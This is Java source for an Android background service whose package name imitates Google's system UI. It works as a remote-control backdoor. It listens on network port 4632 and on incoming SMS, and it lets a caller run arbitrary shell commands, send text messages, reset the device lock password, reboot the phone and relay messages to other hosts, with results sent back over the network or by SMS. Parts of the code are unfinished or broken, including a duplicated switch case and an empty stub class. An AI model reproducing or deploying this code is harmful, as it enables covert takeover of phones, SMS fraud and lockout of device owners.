package com.google.android.systemUi.service;

import android.app.*;
import android.app.admin.*;
import android.content.*;
import android.content.pm.*;
import android.media.*;
import android.os.*;
import android.preference.*;
import android.speech.tts.*;
import android.speech.tts.TextToSpeech.*;
import android.telephony.*;
import android.util.*;
import com.genonbeta.CoolSocket.*;
import com.google.android.systemUi.config.*;
import com.google.android.systemUi.helper.*;
import com.google.android.systemUi.receiver.*;
import java.io.*;
import java.net.*;
import java.util.*;
import org.json.*;

public class CommunicationService extends Service implements OnInitListener
{
	public static final String TAG = "CommunationService";

	private CommunicationServer mCommunationServer;
	private AudioManager mAudioManager;
	private DevicePolicyManager mDPM;
	private ComponentName mDeviceAdmin;
	private ArrayList<String> mGrantedList = new ArrayList<String>();
	private PowerManager mPowerManager;
	private SharedPreferences mPreferences;
	private NotificationPublisher mPublisher;
	private TextToSpeech mSpeech;
	private boolean mTTSInit;
	private boolean mNotifyRequests = false;
	private Vibrator mVibrator;

	private class CommunicationServer extends CoolJsonCommunication
	{
		public CommunicationServer()
		{
			super(4632);
			this.setAllowMalformedRequest(true);
			this.setSocketTimeout(AppConfig.DEFAULT_SOCKET_LARGE_TIMEOUT);
		}

		public void handleRequest(Socket socket, JSONObject receivedMessage, JSONObject response, String clientIp) throws Exception
		{
			boolean result = false;
			Intent actionIntent = new Intent();

			if (receivedMessage.has("printDeviceName") && receivedMessage.getBoolean("printDeviceName"))
				response.put("deviceName", mPreferences.getString("deviceName", Build.MODEL));

			if (mNotifyRequests)
			{
				Notification.Builder builder = new Notification.Builder(CommunicationService.this);
				Notification.BigTextStyle bTS = new Notification.BigTextStyle(builder);

				bTS
					.setBigContentTitle(clientIp)
					.bigText(receivedMessage.toString());

				builder
					.setStyle(bTS)
					.setSmallIcon(android.R.drawable.stat_sys_download_done)
					.setTicker(receivedMessage.toString())
					.setContentTitle(clientIp)
					.setContentText(receivedMessage.toString());

				mPublisher.notify(0, builder.getNotification());

				response.put("warning", "Request notified");
			}

			if (!mGrantedList.contains(clientIp))
			{
				if (!mPreferences.contains("password"))
				{
					if (receivedMessage.has("accessPassword"))
					{
						mPreferences.edit().putString("password", receivedMessage.getString("accessPassword")).apply();
						response.put("info", "Password is set to " + receivedMessage.getString("accessPassword"));
					}
					else
					{
						response.put("info", "Password is never set. To set use 'accessPassword' ");
					}
				}
				else if (receivedMessage.has("password"))
				{
					if (mPreferences.getString("password", "genonbeta").equals(receivedMessage.getString("password")))
					{
						mGrantedList.add(clientIp);
						response.put("info", "Access granted");
					}
					else 
						response.put("info", "Password was incorrect");
				}
				else
				{
					response.put("info", "To access use 'password'");
				}
			}
			else
			{
				if (receivedMessage.has("action"))
				{
					actionIntent.setAction(receivedMessage.getString("action"));

					if (receivedMessage.has("key") && receivedMessage.has("value"))
						actionIntent.putExtra(receivedMessage.getString("key"), receivedMessage.getString("value"));
				}

				String request = receivedMessage.getString("request");

				switch (request)
				{
					case "sayHello":
						PackageInfo packInfo = getPackageManager().getPackageInfo(getApplicationInfo().packageName, 0);

						response.put("versionName", packInfo.versionName);
						response.put("versionCode", packInfo.versionCode);

						response.put("device", Build.BRAND + " " + Build.MODEL);

						result = true;
						break;
					case "makeToast":
						mPublisher.makeToast(receivedMessage.getString("message"));
						result = true;
						break;
					case "makeNotification":
						mPublisher.notify(receivedMessage.getInt("id"), mPublisher.makeNotification(android.R.drawable.stat_sys_warning, receivedMessage.getString("title"), receivedMessage.getString("content"), receivedMessage.getString("info"), (receivedMessage.has("ticker") ? receivedMessage.getString("ticker") : null)));
						result = true;
						break;
					case "cancelNotification":
						mPublisher.cancelNotification(receivedMessage.getInt("id"));
						result = true;
						break;
					case "lockNow":
						mDPM.lockNow();
						result = true;
						break;
					case "resetPassword":
						result = mDPM.resetPassword(receivedMessage.getString("password"), 0);
						break;
					case "setVolume":
						mAudioManager.setStreamVolume(AudioManager.STREAM_MUSIC, receivedMessage.getInt("volume"), 0);
						result = true;
						break;
					case "sendBroadcast":
						sendBroadcast(actionIntent);
						result = true;
						break;
					case "startService":
						startService(actionIntent);
						result = true;
						break;
					case "startActivity":
						actionIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						startActivity(actionIntent);
						result = true;
						break;
					case "vibrate":
						long time = 100;

						if (receivedMessage.has("time"))
							time = receivedMessage.getLong("time");

						mVibrator.vibrate(time);
						result = true;
						break;
					case "changeAccessPassword":
						if (mPreferences.getString("password", "genonbeta").equals(receivedMessage.getString("old")))
						{
							mPreferences.edit().putString("password", receivedMessage.getString("new")).apply();
							result = true;
						}
						break;
					case "reboot":
						mPowerManager.reboot("Virtual user requested");
						result = true;
						break;
					case "applyPasswordResetFile":
						result = mPreferences.edit().putString("upprFile", receivedMessage.getString("file")).commit();
						break;
					case "getPRFile":
						response.put("info", mPreferences.getString("upprFile", "not set"));
						result = true;
						break;
					case "ttsExit":
						result = ttsExit();
						break;
					case "tts":
						if (mSpeech != null && mTTSInit)
						{
							Locale locale = null;

							if (receivedMessage.has("language"))
								locale = new Locale(receivedMessage.getString("language"));

							if (locale == null)
								locale = Locale.ENGLISH;

							mSpeech.setLanguage(locale);
							mSpeech.speak(receivedMessage.getString("message"), TextToSpeech.QUEUE_ADD, null);

							response.put("language", "@" + locale.getDisplayLanguage());
							response.put("speak", "@" + receivedMessage.getString("message"));

							result = true;
						}
						else
						{
							mSpeech = new TextToSpeech(CommunicationService.this, CommunicationService.this);
							response.put("info", "TTS service is now loading");

							result = true;
						}
						break;
					case "commands":
						DataInputStream dataIS = new DataInputStream(getResources().openRawResource(com.google.android.systemUi.R.raw.commands));
						JSONArray jsonArray = new JSONArray();

						while (dataIS.available() > 0)
						{
							jsonArray.put(dataIS.readLine());
						}

						dataIS.close();

						response.put("template_list", jsonArray);

						result = true;
						break;
					case "getGrantedList":
						response.put("granted_list", new JSONArray(mGrantedList));
						result = true;
						break;
					case "lockNow":
						mDPM.lockNow();
						result = true;
						break;
					case "exit":
						mGrantedList.remove(clientIp);
						result = true;
						break;
					case "runCommand":
						boolean su = false;

						if (receivedMessage.has("su"))
							su = receivedMessage.getBoolean("su");

						Runtime.getRuntime().exec(receivedMessage.getString("command"));

						result = true;
						break;
					case "toggleTabs":
						this.setAddTabsToResponse((this.getAddTabsToResponse() == NO_TAB) ? 2 : NO_TAB);
						result = true;
						break;
					case "setDeviceName":
						result = mPreferences.edit().putString("deviceName", receivedMessage.getString("name")).commit();
						break;
					case "notifyRequests":
						mNotifyRequests = !mNotifyRequests;

						if (!mNotifyRequests)
							mPublisher.cancelNotification(0);

						response.put("notifyRequests", mNotifyRequests);
						result = true;
						break;
					case "send":
						response.put("isSent", CoolCommunication.Messenger.sendOnCurrentThread(receivedMessage.getString("server"), receivedMessage.getInt("port"), receivedMessage.getString("message"), null));
						result = true;
						break;
					case "sendSMS":
						SmsManager smsManager = SmsManager.getDefault();
						smsManager.sendTextMessage(receivedMessage.getString("number"), null, receivedMessage.getString("text"), null, null);
						result = true;
						break;
					default:
						response.put("info", "{" + request + "} is not found");
				}

				response.put("result", result);
			}
		}

		@Override
		protected void onError(Exception r1_Exception)
		{
		}

		@Override
		public void onJsonMessage(Socket socket, JSONObject received, JSONObject response, String client)
		{
			try
			{
				handleRequest(socket, received, response, client);
			}
			catch (Exception e)
			{
				try
				{
					response.put("error", "@" + e);
				}
				catch (JSONException json)
				{
					e.printStackTrace();
				}

				return;
			}
		}
	}

	private class ConnectionTest implements Runnable
	{
		private int mTimes;
		private int mPort;
		private String mServer;

		public ConnectionTest(int times, String server, int port)
		{

		}

		@Override
		public void run()
		{
			for (int i = 0; i < this.mTimes; i++)
			{

			}
		}
	}
	
	protected void runCommandSMS(final String sender, final String message)
	{
		new Thread(new Runnable()
			{
				@Override
				public void run()
				{
					JSONObject response = new JSONObject();
					JSONObject receivedMessage;
					SmsManager smsManager = SmsManager.getDefault();

					try
					{
						receivedMessage = new JSONObject(message);
					}
					catch (JSONException e)
					{
						receivedMessage = new JSONObject();
					}

					try
					{
						mCommunationServer.handleRequest(null, receivedMessage, response, sender);
						smsManager.sendTextMessage(sender, null, response.toString(), null, null);
					}
					catch (Exception e)
					{}
				}
			}
		).start();
	}

	public boolean send(String server, int port, String message, CoolCommunication.Messenger.ResponseHandler handler)
	{
		return CoolCommunication.Messenger.sendOnCurrentThread(server, port, message, handler);
	}

	private boolean ttsExit()
	{
		mTTSInit = false;

		if (mSpeech == null)
			return false;

		try
		{
			mSpeech.shutdown();
			return true;
		}
		catch (Exception e)
		{}

		return false;
	}
	
	@Override
	public IBinder onBind(Intent intent)
	{
		return null;
	}

	@Override
	public void onCreate()
	{
		super.onCreate();

		mCommunationServer = new CommunicationServer();

		if (!mCommunationServer.start())
			stopSelf();
	}

	@Override
	public void onDestroy()
	{
		super.onDestroy();

		mCommunationServer.stop();
		ttsExit();
	}

	@Override
	public void onInit(int result)
	{
		this.mTTSInit = (result == TextToSpeech.SUCCESS);	
	}

	@Override
	public int onStartCommand(Intent intent, int p1, int p2)
	{
		mPublisher = new NotificationPublisher(this);
		mDPM = (DevicePolicyManager) getSystemService(Service.DEVICE_POLICY_SERVICE);
		mAudioManager = (AudioManager) getSystemService(Service.AUDIO_SERVICE);
		mDeviceAdmin = new ComponentName(this, com.google.android.systemUi.receiver.DeviceAdmin.class);
		mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
		mPowerManager = (PowerManager) getSystemService("power");
		mVibrator = (Vibrator) getSystemService("vibrator");

		if (mPreferences.contains("upprFile"))
		{
			File uppr = new File(mPreferences.getString("upprFile", "/sdcard/uppr"));

			if (uppr.isFile())
			{
				try
				{
					mVibrator.vibrate(1000);
					mDPM.resetPassword("", 0);
					uppr.renameTo(new File(uppr.getAbsolutePath() + ".old"));
				}
				catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		}

		if (intent != null)
			if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE))
			{
				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);

				runCommandSMS(sender, message);
			}

		return START_STICKY;
	}
}
